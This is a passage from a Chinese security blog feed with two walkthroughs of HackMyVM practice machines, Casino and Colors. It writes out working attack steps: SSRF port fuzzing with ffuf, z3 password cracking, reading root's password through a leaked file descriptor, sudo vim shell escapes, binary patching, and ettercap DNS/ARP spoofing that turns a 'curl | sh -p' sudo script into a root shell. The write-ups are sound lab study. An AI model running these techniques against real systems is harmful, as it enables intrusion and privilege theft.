<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机涉及到的知识点比较多：ftp下载文件，远程计算器脚本的编写，ssh敲门打开端口，反弹shell的绕过方法，pkexec的提权，man查看使用手册（比–help详细），pyc反编译，python2中input的智能转换和动态载入的利用，都很值得学习。</p>
<p>在整个过程中，信息搜集一如既往的重要。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm casino复盘</title>
    <url>/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Casino" >https://hackmyvm.eu/machines/machine.php?vm=Casino<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>靶机ip：192.168.64.82</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描扫到22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165203.png" ></p>
<p>先到80端口，有个登陆页面，不知道账号密码，先注册一个账号</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165317.png" ></p>
<p>登陆进去后有个三个赌博游戏，起始金额是1000$，经过一番探索结合扫到的目录，我随便在猜点数的游戏把金额全部输光，接着界面就给我跳转到以下这个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165533.png" ></p>
<p>注意url是”<strong>&#x2F;casino&#x2F;explainmepls.php?learnabout&#x3D;en.wikipedia.org&#x2F;wiki&#x2F;Dice</strong>“，经过测试没办法文件包含查看一下文件，但是?learnabout&#x3D;<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> 会跳转，猜测是存在ssrf漏洞，验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165739.png" ></p>
<p>会出现最开始看到的登陆页面，接着就fuzz一下对内有哪些端口开了（记得带上cookie）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="number">65535</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> &gt;&gt; dictionary.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">先生成一个脚本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w dictionary.txt -u <span class="string">&#x27;http://192.168.64.82/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ&#x27;</span> -fw 284 -b <span class="string">&quot;PHPSPHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318182217.png" ></p>
<p>扫到了6969端口，先访问看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002002.png" ></p>
<p>是有东西的，扫一下目录看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u <span class="string">&quot;http://192.168.64.82/casino/explainmepls.php?learnabout=localhost:6969/FUZZ&quot;</span> -b <span class="string">&quot;PHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span> -fw 284</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004853.png" ></p>
<p>扫到&#x2F;codebreakers，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.23.29.png" ></p>
<p>看到源码有个shimmer_rsa，访问之后意识一个私钥内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002436.png" ></p>
<p>保存之后利用这个文件ssh登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002651.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002957.png" ></p>
<p>可以看到目录下有个pass，是可以执行的，是要猜密码，传到本地用ida分析看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.31.48.png"  alt="main函数"></p>
<p>点击看一下第一个密码的checkpasswd函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319003547.png" ></p>
<p>有很多个表达式去匹配，我想到用z3去运算出结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建26个变量，每个变量表示字符串中对应位置的字符</span></span><br><span class="line">a = [Int(<span class="string">&#x27;a[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Z3 solver 实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加字符串长度等于 26 的约束</span></span><br><span class="line">solver.add(<span class="built_in">len</span>(a) == <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加各种条件约束</span></span><br><span class="line">solver.add(a[<span class="number">0</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">1</span>] + a[<span class="number">6</span>] == <span class="number">208</span>)</span><br><span class="line">solver.add(a[<span class="number">2</span>] - a[<span class="number">4</span>] == <span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">3</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">4</span>] * a[<span class="number">25</span>] == <span class="number">10100</span>)</span><br><span class="line">solver.add(a[<span class="number">5</span>] + a[<span class="number">17</span>] == <span class="number">219</span>)</span><br><span class="line">solver.add(a[<span class="number">6</span>] - a[<span class="number">10</span>] == -<span class="number">11</span>)</span><br><span class="line">solver.add(a[<span class="number">7</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] * a[<span class="number">17</span>] == <span class="number">11845</span>)</span><br><span class="line">solver.add(a[<span class="number">9</span>] - a[<span class="number">18</span>] == -<span class="number">7</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] - a[<span class="number">24</span>] == <span class="number">1</span>)</span><br><span class="line">solver.add(a[<span class="number">11</span>] * a[<span class="number">4</span>] == <span class="number">9797</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] - a[<span class="number">3</span>] == <span class="number">3</span>)</span><br><span class="line">solver.add(a[<span class="number">13</span>] * a[<span class="number">11</span>] == <span class="number">11252</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] - a[<span class="number">13</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">15</span>] == a[<span class="number">23</span>])</span><br><span class="line">solver.add(a[<span class="number">16</span>] - a[<span class="number">8</span>] == -<span class="number">5</span>)</span><br><span class="line">solver.add(a[<span class="number">17</span>] * a[<span class="number">7</span>] == <span class="number">10815</span>)</span><br><span class="line">solver.add(a[<span class="number">18</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">19</span>] - a[<span class="number">0</span>] == -<span class="number">8</span>)</span><br><span class="line">solver.add(a[<span class="number">20</span>] - a[<span class="number">23</span>] == <span class="number">4</span>)</span><br><span class="line">solver.add(a[<span class="number">21</span>] + a[<span class="number">7</span>] == <span class="number">220</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] - a[<span class="number">1</span>] == <span class="number">15</span>)</span><br><span class="line">solver.add(a[<span class="number">23</span>] == a[<span class="number">15</span>])</span><br><span class="line">solver.add(a[<span class="number">24</span>] * a[<span class="number">2</span>] == <span class="number">12654</span>)</span><br><span class="line">solver.add(a[<span class="number">25</span>] - a[<span class="number">12</span>] == -<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查约束是否满足</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的字符串为：&quot;</span>, result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找不到满足条件的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来的结果是“满足条件的字符串为： ihopethisisastrongpassword”</p>
<p>这样就拿到第一个密码了，依次输入两个密码拿到一个&#x2F;bin&#x2F;sh，注意这里的点是</p>
<p><strong>程序中open了&#x2F;opt&#x2F;root.pass，但是没有close，可以看一下这个文件相关的进程</strong></p>
<p>“在linux中，每个进程的 <code>/proc/&lt;PID&gt;/fd</code> 目录包含了该进程打开的文件描述符的符号链接。你可以通过查看该目录来了解进程打开的文件描述符的相关信息，可以用<code>ls -l /proc/&lt;PID&gt;/fd</code>查看，而一个进程的PID可以用<code>lsof /path/to/your/file</code>查看”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsof /opt/root.pass</span><br><span class="line">COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">sh      768 shimmer    3r   REG    8,1       15 522246 /opt/root.pass</span><br><span class="line">$ <span class="built_in">ls</span> -l /proc/768/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 2 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 shimmer shimmer 64 mar 18 17:43 3 -&gt; /opt/root.pass</span><br><span class="line">$ <span class="built_in">cd</span> /proc/768/fd</span><br><span class="line">$ <span class="built_in">cat</span> &lt;&amp;3</span><br><span class="line">masteradmin420</span><br></pre></td></tr></table></figure>

<p>一顿操作，就拿到了root的密码，su登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004826.png" ></p>
<h4 id="web代码复盘"><a href="#web代码复盘" class="headerlink" title="web代码复盘"></a>web代码复盘</h4><p>在games.php找到跳转explainmepls.php的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$money</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$game</span> != <span class="number">8</span>) &#123; <span class="comment">// 这里就是需要money=0，所以要把钱输光</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$game</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Shell_game&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Russian_roulette&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Dice&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include_once</span> <span class="string">&quot;./games/error.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: explainmepls.php?learnabout=&#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2001.00.46.png" ></p>
<p>触发ssrf漏洞的地方，“<code>file_get_contents()</code> 函数用于从指定的 URL 中获取内容并将其输出。可以通过控制 <code>$learnabout</code> 变量来构造任意 URL”</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>wp说pass那块第一个密码可用angr模块解决，我自己看的时候先想到的是z3，最后也解出来了，后续要学一下</p>
<p>最开始那个赌博游戏也是经过一番探索才找到ssrf那个点，而且刚找到的时候还以为是文件包含（知识不够牢固）关于ssrf利用，端口的fuzz也需要记住，还有就是最后文件打开那块，还能通过lsof找到相关进程，感觉这个思路以后还会遇到，也算是多学习到linux有关的知识了，总的来说这个靶场很值得学习回顾。</p>
<p>所需知识点：ssrf漏洞利用，文件逆向，z3求解，linux进程号查找，端口扫描</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Colors复盘</title>
    <url>/2024/03/20/hackmyvm-Colors%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶场涉及的知识点比较多，思路是大部分学习其他师傅的wp的，写复盘是想记录思路顺便回顾学好每个知识点。</p>
<h4 id="启动前准备"><a href="#启动前准备" class="headerlink" title="启动前准备"></a>启动前准备</h4><p>由于<strong>网卡配置不同</strong>，我每次都需要开靶机刚开启的时候shift+e进入grub编辑，给一个root的&#x2F;bin&#x2F;bash启动编辑一下&#x2F;etc&#x2F;netwrok&#x2F;interfaces里面的网卡配置，这是前置背景。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.92</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到21、22、80端口，并且22端口被过滤了（注意这里要用root扫如果用普通用户扫扫不到22端口信息）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
<p>先访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
<p>只有一张图片，扫目录一无所获，也对图片分析不出什么内容</p>
<p>看看21号端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
<p>看起来可以用anonymous登陆，登陆一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
<p>把secret.jpg下载下来，使用stegseek分析一波</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
<p>搞出来一段字符，在cyberchef分析，是base85</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
<p>得到一个pink的账号密码，这个时候我的思路是去登陆22端口，但是它的端口filted，后来去看了wp才知道这里有一个端口敲门，ftp那里就给了提示（好神奇的点子）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
<p>1127，1039，1081分别对应first，second，third敲门顺序，按顺序敲门端口才会打开，类似情况之前做vuln的DC系列的靶机也遇到过。</p>
<h5 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h5><p>知道了这个思路，我按照常规思路knock三个端口，然而22端口没有按照预期的打开，我试了很多次，还是失败，也不知道原因。第二天为了想实践后面的关卡，想着干脆关了防火墙，所以借助grub登陆root，按照网上给的命令总是失败，更头疼了。然后就想看看knock的配置文件，找到日志文件，一看到enp0s3我就想到要改成enp01，思路就来了。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
<p>于是经过一番搜索，找到&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.service，把里面的enp0s3改成enp0s1，再启动靶机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
<p>这次就可以了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
<p>虽然这个问题是针对自己的电脑产生的，别人的电脑可能不会出现这样的情况，但是整个过程是自己一点一点摸索到，最后成功解决的时候真的很开心，所以值得记录一下。</p>
<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>ok解决了ssh的问题，想用之前拿到的pink账号密码登陆，还是失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
<p>报错说publickey，说明需要密钥文件登陆。搞半天pink的账号密码可以用ftp登陆，对ftp的敏感度还不够，一直没想到，登陆后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
<p>pink目录下有.ssh目录，<strong>思路是在里面上传自己kali的id_rsa.pub（命名为authorized_keys)，然后用那个文件为凭证自己kali登陆ssh</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
<p>登陆成功</p>
<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><p>拿到pink的shell后没能发现什么，接下来的思路是去到&#x2F;var&#x2F;www&#x2F;html上传一个a.php，再在网页端访问a.php，就拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
<p>Sudo -l查看到green有vim可以利用提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>

<p>再输入’:!&#x2F;bin&#x2F;sh’，成功拿到green的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>

<p>到green到家目录下大致可以利用的就是test_4_green，下载到本地，ida打开查看一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
<p>注意到有个jnz比较</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
<p>大致就是比较v8和v7，这里用ida修改一下jnz为jz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
<p>保存后再执行，随便输入一个数字也会爆出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
<p>接着就登陆purple账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>

<p>sudo -l发现有个脚本可以用，就是要下载masterddos.hmv下的attack.sh然后交给&#x2F;usr&#x2F;bin&#x2F;sh 执行</p>
<p><strong>思路是利用dns欺骗，让靶机向自己的kali发送请求，自己的kali伪造一个attack.sh，让靶机访问</strong></p>
<p>步骤：</p>
<p>先在修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns文件，增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>

<p>然后开始dns攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>

<p>在靶机去ping masterddos.hmv，回复的ip是kali的ip，DNS欺骗执行成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>

<p>接着就sudo &#x2F;attack_dir&#x2F;ddos.sh执行脚本</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
<p>成功拿到root的shell，提权成功。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到<strong>DNS欺骗</strong>，学到了，通过ftp敲门那里思路比较清奇，要打破惯性思维，不要一看到账号密码只想到ssh的网页，还有ftp！可执行文件修改（二进制方向的魅力），knock开端口（注意网卡配置）。</p>
<p>这么理下来知识点也不是特别多，但我就要消化好久，自己做的时候没办法想到的思路无非就是因为知识面不够广，还有就是脑子不够灵活（比如没想到拿账号密码登陆ftp），路漫漫。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘学习</tag>
      </tags>
  </entry>
</search>
